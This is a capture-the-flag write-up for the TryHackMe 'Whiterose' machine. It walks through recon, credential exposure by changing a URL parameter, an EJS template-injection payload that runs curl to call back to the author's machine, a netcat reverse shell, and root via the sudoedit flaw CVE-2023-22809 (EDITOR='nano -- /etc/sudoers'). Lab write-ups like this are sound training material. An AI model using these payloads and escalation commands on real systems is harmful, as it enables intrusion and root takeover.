Hi, here is how to successfully complete the machine https://tryhackme.com/r/room/whiterose

## Recon

we start scanning the ports with nmap, we can see that ports 22 and 80 are open.

<pre><code>
  maxi@maxi-notebook ~/C/t/e/w/ports> sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.73.174 | tee nmap1.txt

  Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-12 05:38 -03
Initiating SYN Stealth Scan at 05:38
Scanning 10.10.73.174 [65535 ports]
Discovered open port 22/tcp on 10.10.73.174
Discovered open port 80/tcp on 10.10.73.174
Completed SYN Stealth Scan at 05:39, 26.35s elapsed (65535 total ports)
Nmap scan report for 10.10.73.174
Host is up, received user-set (0.67s latency).
Scanned at 2025-01-12 05:38:54 -03 for 26s
Not shown: 53803 filtered tcp ports (no-response), 11730 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.49 seconds
           Raw packets sent: 126282 (5.556MB) | Rcvd: 11784 (471.368KB) </code></pre>

<pre><code>maxi@maxi-notebook ~/C/t/e/w/ports> sudo nmap -p22,80 -sCV -Pn 10.10.7.103 | tee nmap2.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-12 05:39 -03
Nmap scan report for 10.10.73.174
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.79 seconds</code></pre>

On <code>cyprusbank.thm</code> we can see the following message, there is nothing else on the page
![2025-01-12_08-32](https://github.com/user-attachments/assets/9aa63f5f-30fb-4b18-9ad3-60e3d54cf775)



I searched for directories but found nothing, but the Vhosts scan revealed this
<pre><code> maxi@maxi-notebook ~> ffuf -w /home/maxi/Escritorio/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cyprusbank.thm/ -H "Host:FUZZ.cyprusbank.thm" -fw 1 | tee ffuf.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cyprusbank.thm/
 :: Wordlist         : FUZZ: /home/maxi/Escritorio/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.cyprusbank.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 350ms]
www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 360ms]
</code></pre>




<code>admin.cyprusbank.thm</code> show us a login panel, we have to put the credentials provided in the room description in THM 
![2025-01-12_08-39](https://github.com/user-attachments/assets/c176b448-d93a-4d72-9320-fa68aa060539)

## Tyrell Wellick's Phone

Now we have to search for Tyrell Wellick's phone number, but as we can see all phone numbers are censored.
![2025-01-12_08-40](https://github.com/user-attachments/assets/adcda39f-725f-4fbb-ac87-f269e35dbaf5)

![2025-01-12_08-41](https://github.com/user-attachments/assets/bc17e5e9-2667-4257-81d0-f5bbf34e542b)



We also have a settings section but we do not have permission to access it.
![2025-01-12_08-42](https://github.com/user-attachments/assets/c1fbbe83-ac70-4d03-898b-36d22b3ab470)

![2025-01-12_08-42_1](https://github.com/user-attachments/assets/030b3a5f-83a9-4678-891f-05edbb43e43d)



If we play with the numerical value of the url we will see that the chat changes, setting the value to 0 will reveal new credentials.
![2025-01-12_08-43](https://github.com/user-attachments/assets/ddcc28ac-f0c9-4df0-93ce-7b3a340fdc15)

![2025-01-12_08-45](https://github.com/user-attachments/assets/6bf291fd-08f5-4ad0-a8af-ea28fa794439)



i logout and log in as Gayle, now we can see the phone numbers of all members
![2025-01-12_08-46](https://github.com/user-attachments/assets/d4b1d47b-521b-4151-a15b-7065f6853d8b)

## Shell as web

we also gain access to the settings section, if we enter any values, we see the passwords are reflected, we probably have an XSS
![2025-01-12_08-48](https://github.com/user-attachments/assets/d7cd7858-ac00-4a66-bd6c-a132faacdc04)



we are going to intercept the request, if we delete any parameter we may see the following error message
![2025-01-12_08-50](https://github.com/user-attachments/assets/fdd10f54-1546-4fc8-a59a-b53d3668d33b)



If include, client,or async parameters is configured to accept user-supplied paths, an attacker could attempt to include arbitrary files on the server, which could lead to the exposure of sensitive information or even code execution, I tested but no, it did not work.

<pre><code>TypeError: /home/web/app/views/settings.ejs:4
    2| <html lang="en">
    3|   <head>
 >> 4|     <%- include("../components/head"); %>
    5|     <title>Cyprus National Bank</title>
    6|   </head>
    7|   <body>

include is not a function
    at eval ("/home/web/app/views/settings.ejs":12:17)
    at settings (/home/web/app/node_modules/ejs/lib/ejs.js:692:17)
    at tryHandleCache (/home/web/app/node_modules/ejs/lib/ejs.js:272:36)
    at View.exports.renderFile [as engine] (/home/web/app/node_modules/ejs/lib/ejs.js:489:10)
    at View.render (/home/web/app/node_modules/express/lib/view.js:135:8)
    at tryRender (/home/web/app/node_modules/express/lib/application.js:657:10)
    at Function.render (/home/web/app/node_modules/express/lib/application.js:609:3)
    at ServerResponse.render (/home/web/app/node_modules/express/lib/response.js:1039:7)
    at /home/web/app/routes/settings.js:27:7
    at runMicrotasks (<anonymous>)
</code></pre>



In my search for SSTI payloads that include EJS I found this one

SSTI occurs when user input data is injected directly into server templates without being properly sanitized. This can allow arbitrary code execution on the server.

the first thing I did was to open an http server with python to see if I was indeed getting any requests.

<pre><code>%%1");process.mainModule.require('child_process').execSync('curl 10.11.72.22');//</code></pre>


<pre><code> maxi@maxi-notebook ~ [1]> sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.239.90 - - [12/Jan/2025 08:10:37] "GET / HTTP/1.1" 200 -
10.10.239.90 - - [12/Jan/2025 08:10:38] "GET / HTTP/1.1" 200 -
10.10.239.90 - - [12/Jan/2025 08:10:38] "GET / HTTP/1.1" 200 - </code></pre>



this means that we can spawn a reverse shell
<pre><code> maxi@maxi-notebook ~/C/t/e/w/ports> nc -nlvp 1234
 </code></pre>

![2025-01-12_09-06](https://github.com/user-attachments/assets/fe534c9c-0547-45b7-a392-e782bc4de9ee)


![2025-01-12_08-57](https://github.com/user-attachments/assets/7b2cd816-2383-4113-b44a-fdde1fc300cd)


<pre><code>Connection from 10.10.239.90:54900
whoami
web
 </code></pre>

<pre><code> Connection from 10.10.239.90:54900
> whoami
web

> ls
components
index.js
node_modules
package.json
package-lock.json
routes
static
views
  
> cd ~
ls
app
user.txt
</code></pre>

## Shell as Root

We can run sudoedit as root without a password using sudo for the file /etc/nginx/sites-available/admin.cyprusbank.thm
<pre><code> sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm </code></pre>



Vulnerability CVE-2023-22809 affects specific versions of sudo, a tool widely used on Unix/Linux systems to execute commands with elevated privileges. This vulnerability resides in sudoedit, a sudo feature that allows users to edit files as superuser using their preferred editor.

An attacker with access to a user account can exploit this vulnerability to escalate privileges and execute arbitrary commands as root, compromising system security.

sudoedit does not correctly handle certain combinations of relative paths and special characters in the arguments provided.

An attacker can create specific paths that exploit this flaw to access or overwrite arbitrary files on the system, including those owned by root.

<pre><code> sudoedit -V
Sudo version 1.9.12p1
Sudoers policy plugin version 1.9.12p1
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.12p1
Sudoers audit plugin version 1.9.12p1 
</code></pre>



we can edit /etc/shadow, sudoers, or system configuration files.

<pre><code>export EDITOR="nano -- /etc/sudoers"
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm</code></pre>

<pre><code>   [1/2]                   /var/tmp/sudoers.NFpNOvMy                             

## sudoers file.
##
## This file MUST be edited with the 'visudo' command as root.
## Failure to use 'visudo' may result in syntax or file permission errors
## that prevent sudo from running.
##
## See the sudoers man page for the details on how to write a sudoers file.
##

##
## Host alias specification
##
## Groups of machines. These may include host names (optionally with wildcards),
## IP addresses, network numbers or netgroups.
# Host_Alias    WEBSERVERS = www1, www2, www3

##
## User alias specification
##
                               [ Read 14 lines ]
^G Get Help  ^O Write Out ^W Where Is  ^K Cut Text  ^J Justify   ^C Cur Pos
^X Close     ^R Read File ^\ Replace   ^U Uncut Text^T To Spell  ^_ Go To Line </code></pre>



in the same way we can also read root.txt
<pre><code>  export EDITOR="vi -- /root/root.txt"
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
 </code></pre>
